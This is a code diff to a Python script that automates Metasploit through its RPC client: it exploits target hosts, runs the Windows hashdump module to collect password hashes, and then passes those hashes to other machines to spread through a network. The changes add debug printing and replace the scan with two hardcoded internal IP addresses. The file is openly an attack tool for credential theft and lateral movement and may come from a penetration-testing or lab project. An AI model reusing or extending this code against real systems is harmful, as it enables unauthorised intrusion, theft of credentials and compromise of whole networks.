@@ -126,13 +126,15 @@ def runExploit(client, exploit, payload):
     # Exploit the host
     proc = exploit.execute(payload=payload)
     jobId = proc.get('job_id') + 1 # add 1 because pymetasploit is horribly written
+    print(proc.get('job_id'))
+    print(jobId)
     timeout = 50
     count = 0
     while(jobId not in client.sessions.list.keys() and count < timeout):
-        time.sleep(3)
+        time.sleep(1)
+        print(client.sessions.list.keys())
         count += 1
     if count >= timeout:
-        client.sessions.session(jobId).kill()
         return None
     # Get the shell and run the hashdump
     shell = client.sessions.session(jobId)
@@ -141,6 +143,8 @@ def runExploit(client, exploit, payload):
     shell.runsingle('run post/windows/gather/hashdump')
     while(True):
         output = shell.read()
+        if len(output) > 0:
+            print(output)
         if(':::' in output):
             hashes = gatherHashes(output)
             client.sessions.session(jobId).kill()
@@ -170,7 +174,7 @@ def main():
     args = getArgs(sys.argv)
     if args == None:
         return
-    targets = nmScan(args['targetIp'])
+    targets = [ { 'ip': '10.202.208.174', 'osfamily': '', 'osgen': [] }, { 'ip': '10.202.208.190', 'osfamily': '', 'osgen': [] }] #nmScan(args['targetIp'])
     print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
 
     client = setupRPC()
@@ -182,7 +186,9 @@ def main():
             targets.pop(i)
             hashes = hashData
             break
+
     if len(hashes) > 0:
+        print(hashes)
         # Found access to network start spidering
         print('Starting hash passing...')
         for i in range(len(targets)):
@@ -190,6 +196,7 @@ def main():
             if newHashes != None:
                 print('Adding ' + str(len(newHashes)) + ' to the hash list')
                 mergeList(hashes, newHashes)
+                print(hashes)
                 targets.pop(i)
     else:
         print('Could not gain access to network... bye!')
